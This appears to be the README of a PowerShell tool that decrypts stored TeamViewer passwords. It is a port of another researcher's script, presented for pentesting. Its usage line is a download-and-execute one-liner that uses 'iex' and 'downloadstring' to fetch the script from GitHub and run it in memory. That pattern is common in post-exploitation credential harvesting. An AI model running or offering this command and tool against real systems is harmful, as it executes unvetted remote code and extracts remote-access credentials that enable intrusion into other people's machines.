# TeamViewerDecrypt - Powershell

Just a quick dirty Powershell implementation of [whynotsecurity](https://github.com/whynotsecurity/)´s Teamviewer decrypt script.

All credit goes to him, blog post can be found here: https://whynotsecurity.com/blog/teamviewer/

Not all passwords in every version can be decrypted using this script. I could not decrypt Teamviewer v14/v15 PermanentPasswords so far.

Usage as simple as:

```
iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/TeamViewerDecrypt/master/TeamViewerDecrypt.ps1');TeamviewerDecrypt
```
![alt text](https://github.com/S3cur3Th1sSh1t/TeamViewerDecrypt/raw/master/Decrypt.JPG)

As always only use for educational or pentesting purposes. :)
